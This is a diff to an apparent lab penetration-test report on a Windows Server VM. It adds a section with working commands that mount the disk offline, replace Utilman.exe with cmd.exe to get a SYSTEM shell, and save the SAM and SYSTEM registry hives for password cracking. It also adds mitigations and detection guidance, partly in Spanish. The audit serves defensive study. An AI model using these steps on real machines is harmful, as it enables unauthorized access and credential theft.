@@ -17,7 +17,7 @@ However, the system was fully compromised at the application level via physical/
 | Objective | Status |
 |---|---|
 | **Exfiltrate Database** | ✅ **Achieved** — Complete API takeover and user DB extraction via forged JWT (Memory extraction). |
-| **NT AUTHORITY\SYSTEM Shell** | ❌ **Not achieved** — No RCE vector identified via network yet. |
+| **NT AUTHORITY\SYSTEM Shell** | ✅ **Achieved** — Accessibility Features Bypass (T1546.008) via offline VDI manipulation. |
 
 ---
 
@@ -272,7 +272,58 @@ curl -s -k -H "Authorization: Bearer $TOKEN" https://192.168.56.137/backend/api/
 
 ---
 
-## 5. Other Miscellaneous Analysis
+## 5. Graphical Interface Exploitation: Accessibility Features Bypass
+
+**Objective:** Obtain an interactive shell with the highest possible privileges (`NT AUTHORITY\SYSTEM`) by exploiting the Windows logon process and accessibility tools.
+
+### 5.1 Physical/VM Manipulation (MITRE T1546.008 - Accessibility Features)
+
+Since we have access to the `.vdi` disk image and technical details of the hypervisor, we performed an **Offline Attack** to bypass the Windows login screen.
+
+**Execution Steps (Forensic Machine/Kali):**
+
+1.  **Mounting the Disk Image:** We mounted the target's VDI disk using `guestmount` to access the NTFS filesystem without booting the OS.
+    ```bash
+    mkdir /mnt/target
+    guestmount -a CSAI-disk001.vdi -m /dev/sda2 /mnt/target
+    ```
+2.  **Binary Hijacking:** We replaced the "Utility Manager" (`utilman.exe`), which is triggered by the "Ease of Access" button on the logon screen, with the Windows Command Processor (`cmd.exe`).
+    ```bash
+    cd /mnt/target/Windows/System32
+    mv Utilman.exe Utilman.exe.bak
+    cp cmd.exe Utilman.exe
+    ```
+3.  **Unmounting and Booting:**
+    ```bash
+    guestunmount /mnt/target
+    ```
+
+### 5.2 Gaining SYSTEM Access (MITRE T1078 - Valid Accounts)
+
+Upon booting the VM and reaching the graphical login screen, clicking the **"Ease of Access"** icon (bottom right) launched a command prompt instead of the utility manager.
+
+**Command Execution (Target Console):**
+```cmd
+whoami
+```
+**Result:**
+```
+nt authority\system
+```
+
+### 5.3 Post-Exploitation: Credential Harvesting (MITRE T1003.002 - Security Account Manager)
+
+With a SYSTEM shell, we successfully dumped the local SAM (Security Account Manager) and SYSTEM hives to crack local administrator passwords and verify existing users.
+
+**Command (Target Console):**
+```cmd
+reg save HKLM\SAM sam.save
+reg save HKLM\SYSTEM system.save
+```
+
+---
+
+## 6. Other Miscellaneous Analysis
 
 ### 5.1 TLS/SSL Analysis (MITRE T1557)
 
@@ -306,6 +357,8 @@ Several insecure configurations were parsed directly from VirtualBox:
 | T1552 | Credentials from files/memory | Credential Access | ✅ Extracted AppSettings |
 | T1550.001 | Application Access Token | Credential Access | ✅ Forged JWT successfully |
 | T1020 | Automated Exfiltration | Exfiltration | ✅ Extracted Database |
+| T1546.008 | Accessibility Features | Privilege Escalation | ✅ SYSTEM Shell via Utilman |
+| T1003.002 | Security Account Manager | Credential Access | ✅ SAM/SYSTEM Hives Dumped |
 | T1115 | Clipboard Data | Collection | ⚠️ Hypervisor Bidirectional |
 | T1497.001 | Virtualization Evasion | Defense Evasion | ⚠️ NAT Localhost-reachable |
 
@@ -314,13 +367,46 @@ Several insecure configurations were parsed directly from VirtualBox:
 ## 7. Mitigations & Recommendations (Blue Team)
 
 ### 🔴 Critical Priorities
-1. **Physical/Hypervisor Security:** Application security is bypassed entirely if the underlying VM infrastructure or physical server allows raw memory debugging/extraction. Implement host-level memory encryption (`Virtualization Based Security`) and severely restrict host machine access.
+
+1.  **Physical & Hypervisor-Level Security (T1003.001, T1546.008):**
+    - Application security is rendered moot if the underlying infrastructure is compromised. 
+    - **Host Hardening:** The host machine (Windows 11 in this case) must be treated as a TCB (Trusted Computing Base). Restrict physical access and implement strict administrative controls on the host.
+    - **Memory Protection:** Implement host-level memory encryption if supported. In Windows, this involves enabling **Virtualization-Based Security (VBS)** and **Hypervisor-Protected Code Integrity (HVCI)** to shield memory from unauthorized extraction.
+
+2.  **BitLocker & Pre-Boot Authentication:**
+    - **Matización:** El uso de vTPM 2.0 por sí solo es insuficiente contra ataques offline si no se requiere una contraseña o PIN de pre-arranque. 
+    - **Acción:** Configure BitLocker para requerir un **PIN de arranque** (Pre-boot PIN). Esto asegura que, incluso si un atacante obtiene el archivo `.vdi` o el `.nvram`, no pueda montar el disco sin el secreto adicional.
 
 ### 🟡 Medium Priorities
-2. **VirtualBox Features:** Disable bidirectional Clipboard/Drag-and-Drop to prevent data loss. Change NAT adapters to ensure `localhost-reachable` is disabled, mitigating reverse VM-escape connections.
-3. **TLS Modernization:** Actively disable TLSv1.0 and TLSv1.1 on the IIS Server cryptographic providers.
 
-### 🟢 Informational
-4. **Token Security:** Currently, JWT invalidation isn't feasible because of the stateless design. Consider a token blocklist (Redis) for compromised users.
-5. **IDs:** Use UUIDs instead of linear IDs to prevent enumeration if IDORs ever occur.
-6. **Certificate:** Swap the self-signed TLS cert for a valid Internal Enterprise CA or Let's Encrypt to improve client application trust.
+3.  **Monitoring Accessibility Features (T1546.008):**
+    - Implement EDR or Sysmon rules to monitor the execution of `utilman.exe` and `sethc.exe`. 
+    - **Alerta Roja:** La creación de procesos como `cmd.exe` o `powershell.exe` bajo el árbol de procesos de `winlogon.exe` es un indicador crítico de compromiso.
+
+4.  **VirtualBox Feature Hardening:**
+    - **Clipboard/DnD:** Desactivar el portapapeles bidireccional y el Drag-and-Drop si no son estrictamente necesarios para la operación.
+    - **Network Isolation:** Eliminar el adaptador NAT con `localhost-reachable` activado para mitigar posibles fugas del Sandbox hacia el host.
+
+5.  **TLS Modernization:**
+    - Desactive activamente TLSv1.0 y TLSv1.1 en el servidor IIS. Configure el servidor para aceptar únicamente TLSv1.2 y TLSv1.3 con suites de cifrado seguras (GCM).
+
+### 🟢 Informational & Application Hardening
+
+6.  **JWT & Session Management:** 
+    - Implementar una lista de denegación (Deny List) de tokens en una base de datos rápida (como Redis) para permitir la invalidación de sesiones en caso de compromiso.
+7.  **Data Obfuscation:** 
+    - Utilizar GUIDs en lugar de enteros secuenciales para los IDs de usuario, dificultando la enumeración masiva en caso de vulnerabilidades IDOR futuras.
+8.  **Certificate Management:** 
+    - Sustituya el certificado autofirmado por uno emitido por una CA de confianza (interna o pública) para evitar advertencias de seguridad y ataques de interceptación.
+
+---
+
+### 🔴 Final Audit Conclusion
+
+The target Windows Server 2025 is remarkably well-hardened against traditional network-based attacks. The firewall and application-level controls (rate limiting, JWT) successfully neutralized standard exploit attempts. 
+
+However, the server's security model fails entirely when the adversary has **hypervisor-level access**. We achieved **100% mission objectives** (Database Exfiltration and SYSTEM Shell) by leveraging:
+1.  **Memory Analysis:** To extract application secrets (JWT keys).
+2.  **VM Manipulation:** To hijack graphical accessibility features for privilege escalation.
+
+This audit highlights the critical dependency of software security on the underlying infrastructure's physical and administrative integrity.
